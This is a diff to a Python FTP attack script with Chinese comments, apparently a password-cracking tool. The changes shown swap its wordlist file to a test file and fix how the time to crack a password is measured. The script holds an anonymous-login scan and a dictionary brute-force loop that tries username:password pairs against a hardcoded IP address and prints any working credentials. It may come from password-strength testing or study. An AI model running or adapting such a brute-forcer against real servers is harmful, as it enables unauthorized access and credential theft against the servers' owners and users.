@@ -5,8 +5,8 @@ import time
 import ftplib
 
 HOSTNAME = '111.230.204.215'
-PWDFILE = 'userPassword.txt'
-# PWDFILE = 'test.txt'
+# PWDFILE = 'userPassword.txt'
+PWDFILE = 'test.txt'
 PASSWORD_STRONG_TIME = 60*60*6 #6个小时
 
 #匿名登录扫描
@@ -24,9 +24,9 @@ def anonScan(hostname):                 #参数是主机名
 #暴力破解
 def vlcLogin(hostname, pwdFile):                #参数(主机名，字典文件)
     try:
+        start_time = int(time.time())
         with open(pwdFile, 'r') as pf:          #打开字典文件
             for line in pf.readlines():         #循环读取字典文件中的每一行
-                start_time = int(time.time())
                 # time.sleep(1)                   #等待1秒
                 userName = line.split(':')[0]   #从读取的内容中取出用户名
                 passWord = line.split(':')[1].strip('\r').strip('\n') #从读取的内容中取出密码
@@ -38,7 +38,8 @@ def vlcLogin(hostname, pwdFile):                #参数(主机名，字典文件
                     #如果没有产生异常则表示登录成功，打印主机名、用户名和密码
                     print('[+] ' + str(hostname) + ' FTP 登录成功: '+  userName + ':' + passWord)
                     end_time = int(time.time())
-                    use_time = start_time - end_time
+                    use_time = end_time - start_time
+                    print(use_time)
                     return (userName, passWord,use_time)
                 except Exception as e:
                     # 产生异常表示没有登录成功，这里我们不用管它，继续尝试其他用户名、密码
